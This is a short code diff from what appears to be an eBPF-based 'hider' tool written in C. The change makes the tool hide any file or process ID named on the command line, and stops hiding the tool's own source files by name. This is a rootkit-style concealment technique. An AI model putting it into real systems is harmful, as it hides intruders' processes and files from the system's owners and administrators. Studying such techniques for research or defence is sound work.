@@ -94,12 +94,14 @@ int main(int argc, char *argv[])
 
     init_bpf();
     add_blacklist_file("hide_pid");
-    add_blacklist_file("hider.bpf.c");
-    add_blacklist_file("hider.bpf.o");
-    add_blacklist_file("hider.skel.h");
 
     sprintf(my_pid_str, "%d", my_pid);
     add_blacklist_file(my_pid_str); // Hiding a PID is the same as hiding any files (in this case, a folder named after my ID)
+
+    if (argc > 1) {
+        char *hide = argv[1];
+        add_blacklist_file(hide);
+    }
 
     printf("Successfully started!\n");
 
